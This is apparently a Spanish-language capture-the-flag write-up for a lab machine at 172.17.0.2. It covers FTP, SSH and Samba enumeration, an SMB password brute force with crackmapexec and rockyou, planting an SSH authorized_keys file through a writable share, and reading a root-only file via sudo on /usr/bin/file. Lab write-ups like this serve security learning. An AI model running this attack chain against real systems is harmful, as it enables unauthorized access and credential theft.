## Reconocimiento:

Puerto 21 : Ftp

Puerto 22 : SSH

Puerto 139 : Netbios-ssn

Puerto 445 : Microsoft-ds

El servicio ftp no tiene credenciales y extraemos un archivo  llamado “nota.txt”:

```bash
"I don't knopw what to do with Macarena, she`s so obsessed with Donald." 
```

Posibles usuarios.

Ahora investigo el servicio samba:

```bash
enum4linux 172.17.0.2
```

Encuentro varios directorios y el usuario macarena.

Aplico un ataque de Fuerza bruta:

```bash
crackmapexec smb 172.17.0.2 -u macarena -p rockyou.txt —shares
```

La contraseña es “Donald” 

Listando el servicio no encuentro nada interesante pero se pueden crear y cargar carpetas y archivos. Así que voy a entrar a ssh por ahí:

```bash
mkdir .ssh
```

Desde el host :

```bash
ssh-keygen -t rsa -b 4096

cp ~/.ssh/id_rsa.pub .
```

Dentro de samba

```bash
cd.ssh/
put id_rsa.pub
```

Desde el host :

```bash
cat id_rsa.pub > authorized_keys
```

Desde Samba : 

```bash
put authorized_keys
```

Y logeamos ssh

```bash
ssh -i ~/.ssh/id_rsa macarena@172.17.0.2
```

## Escalada:

Hay una carpeta llamada “/secret” en el directorio de macarena, dentro hay un hash que decriptado es:

```bash
echo "HASH" | base64 -d # da HASH1
echo "HASH1" | base32 -d
```

La contraseña de macarena es “supersecurepassword” y ya puedo listar privilegos:

```bash
sudo -l 
(ALL : ALL) /usr/bin/file
```

Investigando encuentro que en el directorio /opt hay un archivo llamado “password.txt” que solo puede leer root, así que uso el binario:

```bash
sudo /usr/bin/file -f /opt/password.txt
# Info:
root:rooteable2
```

Listo.
